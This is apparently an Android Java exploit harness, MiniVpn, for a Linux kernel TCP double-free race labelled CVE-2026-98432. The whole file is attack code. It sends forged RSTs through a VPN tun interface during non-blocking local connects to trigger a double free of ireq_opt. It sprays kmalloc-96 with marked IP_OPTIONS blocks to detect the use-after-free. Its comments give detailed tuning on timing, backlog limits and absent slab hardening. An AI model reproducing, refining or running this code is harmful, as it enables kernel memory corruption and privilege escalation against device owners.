package com.mini;

import android.content.Intent;
import android.net.VpnService;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.FileOutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.channels.SocketChannel;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Dual-path harness for CVE-2026-98432.
 *
 * The two halves of the race are driven through different kernel paths:
 *
 *   CPU A -- a socket connects to one of our own addresses. The destination is
 *            local, so ip_route_input() resolves RTN_LOCAL and the packet is
 *            delivered inside the connect() syscall. The ACK that reaches
 *            tcp_v4_syn_recv_sock() is therefore produced on a normal syscall
 *            path, not on the tun softirq path.
 *
 *   CPU B -- forged RSTs go in through the tun. tcp_check_req() drops the
 *            request sock for any RST without consulting the sequence number
 *            (verified in the shipped vmlinux at tcp_check_req+0x27c: the only
 *            thing between the RST flag test and the drop is a per-cpu
 *            counter increment), so an RST that lands while syn_recv_sock()
 *            is running makes inet_ehash_nolisten() fail, which is the path
 *            that frees inet_opt and then frees it again.
 *
 * Ordering matters and is the whole trick. Earlier versions armed a helper
 * thread and then called a blocking connect(); by the time that helper was
 * scheduled, the request sock was already gone and every attempt succeeded.
 * Here the connect is non-blocking, so the SYN goes out and control returns
 * immediately to the same thread, which starts writing RSTs right away with
 * no scheduler hand-off in between.
 *
 * Counters:
 *   ok  -> handshake completed, i.e. the RSTs arrived too late
 *   rst -> the request sock was dropped by a forged RST (race was reached)
 */
public class MiniVpn extends VpnService implements Runnable {

    static final String TAG = "MiniVpn";

    /** Address of the tun; becomes a local address of the device. */
    static final String IP = "10.7.7.1";
    /** Listener port. */
    static final int PORT = 47777;
    /** RSTs written per batch by the spray thread. */
    static final int BURST = 32;
    /** Poll budget for finishConnect(), in iterations. */
    static final int FINISH_POLLS = 400;
    /**
     * The spray pins one source port so that a continuous RST stream covers
     * the whole connect() interval. A per-round burst cannot do that: by the
     * time connect() returns, local delivery has already walked SYN, SYNACK
     * and ACK inside the same syscall and the request sock is gone.
     */
    static final int PINNED_SPORT = 39999;
    /**
     * Independent (spray + connect) pairs. Hitting the request sock at all is
     * rare; hitting it inside syn_recv_sock() is two orders of magnitude
     * rarer, because that window is a few microseconds while the request sock
     * itself lives for hundreds. More workers is the only lever that scales.
     */
    static final int WORKERS = 3;

    static volatile String status = "idle";
    static final AtomicLong rounds = new AtomicLong();
    static final AtomicLong okCount = new AtomicLong();
    static final AtomicLong rstCount = new AtomicLong();
    static final AtomicLong errCount = new AtomicLong();
    static final AtomicLong bindFail = new AtomicLong();
    /** Churn-specific failures, kept separate from tun write errors. */
    static final AtomicLong churnErr = new AtomicLong();
    /** How many churn slots were found holding somebody else's marker. */
    static final AtomicLong overlap = new AtomicLong();
    /** Slots kept alive by the kmalloc-96 churn detector. */
    static final int RING = 64;

    private ParcelFileDescriptor pfd;
    private FileOutputStream fos;
    private volatile boolean running = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (running) {
            return START_STICKY;
        }
        try {
            Builder b = new Builder();
            b.setSession("mini");
            b.addAddress(IP, 32);
            pfd = b.establish();
            if (pfd == null) {
                status = "establish returned null";
                Log.e(TAG, status);
                return START_STICKY;
            }
            fos = new FileOutputStream(pfd.getFileDescriptor());
            running = true;
            new Thread(this, "driver").start();
            status = "running";
            Log.i(TAG, "tun up on " + IP + "/32");
        } catch (Throwable t) {
            status = "start failed: " + t;
            Log.e(TAG, "start", t);
        }
        return START_STICKY;
    }

    @Override
    public void run() {
        startListener();
        sleepQuiet(300);

        for (int w = 0; w < WORKERS; w++) {
            final int sport = PINNED_SPORT - w;

            Thread spray = new Thread(new Runnable() {
                @Override
                public void run() {
                    sprayLoop(sport);
                }
            }, "spray" + w);
            spray.start();

            Thread conn = new Thread(new Runnable() {
                @Override
                public void run() {
                    clientLoop(sport);
                }
            }, "conn" + w);
            conn.start();
        }

        Thread detect = new Thread(new Runnable() {
            @Override
            public void run() {
                churnLoop();
            }
        }, "churn");
        detect.start();
    }

    /**
     * kmalloc-96 overlap detector.
     *
     * An ip_options_rcu is 72 bytes (rcu_head 16 + ip_options 56), so a 40-byte
     * IP_OPTIONS block lands in kmalloc-96 -- the same cache as the request
     * sock's ireq_opt that the double free targets. Each churned socket gets a
     * unique marker written into the RR route area; a fresh allocation is made
     * on every iteration so that if the freelist ever hands the same object out
     * twice, one slot's marker overwrites the neighbour's and we can see it.
     *
     * This is the only way to prove the UAF actually landed: SLUB here has
     * neither FREELIST_HARDENED nor BUG_ON_DATA_CORRUPTION, and /proc/slabinfo
     * is not readable from this domain, so nothing crashes and nothing counts.
     */
    private void churnLoop() {
        int[] fds = new int[RING];
        int[] marks = new int[RING];
        for (int k = 0; k < RING; k++) {
            fds[k] = -1;
        }

        int pos = 0;
        int counter = 0;
        while (running) {
            int mark = counter;
            int fd = nativeChurn(mark);
            if (fd < 0) {
                churnErr.incrementAndGet();
                if (churnErr.get() <= 3) {
                    Log.w(TAG, "nativeChurn errno=" + (-fd));
                }
                continue;
            }

            /*
             * Self-test once: if the kernel normalised the option block on the
             * way in, every later comparison would be a false positive.
             */
            if (counter == 0) {
                byte[] back = new byte[64];
                int n = nativeDump(fd, back);
                Log.i(TAG, "selftest mark=0 dump=" + hex(back, n));
            }

            /* Is the slot we are about to evict still carrying its own mark? */
            if (fds[pos] >= 0) {
                int v = nativeVerify(fds[pos], marks[pos]);
                if (v == 0) {
                    overlap.incrementAndGet();
                    Log.w(TAG, "OVERLAP slot=" + pos
                            + " mark=" + marks[pos]
                            + " total=" + overlap.get());
                }
                nativeClose(fds[pos]);
            }

            fds[pos] = fd;
            marks[pos] = mark;
            pos = (pos + 1) % RING;
            counter++;

            if ((counter % 2000) == 0) {
                Log.i(TAG, "churn=" + counter
                        + " overlap=" + overlap.get()
                        + " churnErr=" + churnErr.get());
            }
        }
    }

    /* ------------------------------------------------------------------
     * JNI side of the kmalloc-96 churn.
     *
     * Done in native code because libcore.io.Libcore is a dead end here:
     * on Android 13 Libcore.os resolves to ActivityThread$AndroidOs, which
     * has no setsockoptBytes method, and a lazily created Java Socket has no
     * kernel fd at all until it is bound.
     * ------------------------------------------------------------------ */

    static {
        System.loadLibrary("native");
    }

    /** Create a socket with a marked IP_OPTIONS block. Returns fd or -errno. */
    static native int nativeChurn(int mark);

    /** 1 = block still matches mark, 0 = somebody else owns it, -1 = error. */
    static native int nativeVerify(int fd, int mark);

    /** Copy the raw option block into out; returns byte count or -errno. */
    static native int nativeDump(int fd, byte[] out);

    static native void nativeClose(int fd);

    static String hex(byte[] b, int len) {
        if (b == null) {
            return "null";
        }
        int n = Math.min(Math.max(len, 0), b.length);
        StringBuilder sb = new StringBuilder(n * 2);
        for (int i = 0; i < n; i++) {
            sb.append(String.format("%02x", b[i]));
        }
        return sb.toString();
    }

    /**
     * Continuous RST stream on one pinned source port, paired with the connect
     * loop that uses the same port. It runs for the whole session, so some RST
     * is always in flight while connect() is walking the handshake, instead of
     * arriving only after the fact.
     *
     * The batch is deliberately small and followed by a yield: writing flat out
     * overflows netdev_max_backlog (default 1000), and those drops do not show
     * up in any IP counter, which is what made the earlier runs look like the
     * RSTs were being ignored by the socket layer.
     */
    private void sprayLoop(int sport) {
        byte[] pkt = buildRst(sport);
        while (running) {
            for (int k = 0; k < BURST; k++) {
                try {
                    fos.write(pkt);
                } catch (Throwable t) {
                    errCount.incrementAndGet();
                    break;
                }
            }
            Thread.yield();
        }
    }

    private void startListener() {
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                ServerSocket ss = null;
                try {
                    ss = new ServerSocket();
                    ss.setReuseAddress(true);
                    ss.bind(new InetSocketAddress(InetAddress.getByName(IP), PORT), 128);
                    while (running) {
                        Socket s = ss.accept();
                        s.close();
                    }
                } catch (Throwable ex) {
                    status = "listener: " + ex;
                    Log.e(TAG, "listener", ex);
                } finally {
                    closeQuiet(ss);
                }
            }
        }, "listen");
        t.start();
    }

    private void clientLoop(int sport) {
        final InetAddress local = resolve(IP);
        if (local == null) {
            status = "bad ip";
            return;
        }
        final InetSocketAddress target = new InetSocketAddress(local, PORT);
        final InetSocketAddress source = new InetSocketAddress(local, sport);

        int i = 0;
        while (running) {
            i++;

            SocketChannel ch = null;
            try {
                ch = SocketChannel.open();
                ch.configureBlocking(false);
                ch.socket().setReuseAddress(true);
                /*
                 * RST on close: keeps the pinned source port out of TIME_WAIT
                 * so it can be reused on the very next round.
                 */
                ch.socket().setSoLinger(true, 0);
                ch.socket().bind(source);
            } catch (Throwable t) {
                bindFail.incrementAndGet();
                closeQuiet(ch);
                rounds.incrementAndGet();
                continue;
            }

            try {
                ch.connect(target);
                if (awaitConnect(ch)) {
                    okCount.incrementAndGet();
                } else {
                    rstCount.incrementAndGet();
                }
            } catch (Throwable t) {
                rstCount.incrementAndGet();
            } finally {
                closeQuiet(ch);
            }

            rounds.incrementAndGet();
            if ((i % 200) == 0) {
                Log.i(TAG, "rounds=" + rounds.get()
                        + " ok=" + okCount.get()
                        + " rst=" + rstCount.get()
                        + " bindFail=" + bindFail.get()
                        + " err=" + errCount.get());
            }
        }
    }

    /** Bounded busy poll: the handshake either lands within the budget or not. */
    private boolean awaitConnect(SocketChannel ch) {
        for (int n = 0; n < FINISH_POLLS; n++) {
            try {
                if (ch.finishConnect()) {
                    return true;
                }
            } catch (Throwable t) {
                return false;
            }
        }
        return false;
    }

    private byte[] buildRst(int sport) {
        byte[] p = new byte[40];
        int addr = toInt(IP);

        p[0] = 0x45;
        put16(p, 2, 40);
        put16(p, 4, (int) (System.nanoTime() & 0xffff));
        put16(p, 6, 0x4000);
        p[8] = 64;
        p[9] = 6;
        put32(p, 12, addr);
        put32(p, 16, addr);
        put16(p, 10, csum(p, 0, 20, 0));

        put16(p, 20, sport);
        put16(p, 22, PORT);
        put32(p, 24, (int) System.nanoTime());
        put32(p, 28, 0);
        p[32] = 0x50;
        p[33] = 0x04;
        put16(p, 34, 0);
        put16(p, 36, 0);
        put16(p, 38, 0);

        int sum = 0;
        sum += ((addr >> 16) & 0xffff) + (addr & 0xffff);
        sum += ((addr >> 16) & 0xffff) + (addr & 0xffff);
        sum += 6;
        sum += 20;
        put16(p, 36, csum(p, 20, 20, sum));
        return p;
    }

    static InetAddress resolve(String s) {
        try {
            return InetAddress.getByName(s);
        } catch (Throwable t) {
            return null;
        }
    }

    static int toInt(String s) {
        String[] a = s.split("\\.");
        return ((Integer.parseInt(a[0]) & 0xff) << 24)
                | ((Integer.parseInt(a[1]) & 0xff) << 16)
                | ((Integer.parseInt(a[2]) & 0xff) << 8)
                | (Integer.parseInt(a[3]) & 0xff);
    }

    static void put16(byte[] b, int o, int v) {
        b[o] = (byte) ((v >> 8) & 0xff);
        b[o + 1] = (byte) (v & 0xff);
    }

    static void put32(byte[] b, int o, int v) {
        b[o] = (byte) ((v >> 24) & 0xff);
        b[o + 1] = (byte) ((v >> 16) & 0xff);
        b[o + 2] = (byte) ((v >> 8) & 0xff);
        b[o + 3] = (byte) (v & 0xff);
    }

    static int csum(byte[] b, int off, int len, int init) {
        long s = init & 0xffffffffL;
        for (int i = 0; i < len; i += 2) {
            int hi = b[off + i] & 0xff;
            int lo = (i + 1 < len) ? (b[off + i + 1] & 0xff) : 0;
            s += (hi << 8) | lo;
        }
        while ((s >> 16) != 0) {
            s = (s & 0xffff) + (s >> 16);
        }
        return (int) (~s) & 0xffff;
    }

    static void closeQuiet(java.io.Closeable c) {
        if (c == null) {
            return;
        }
        try {
            c.close();
        } catch (Throwable ignored) {
        }
    }

    static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (Throwable ignored) {
        }
    }
}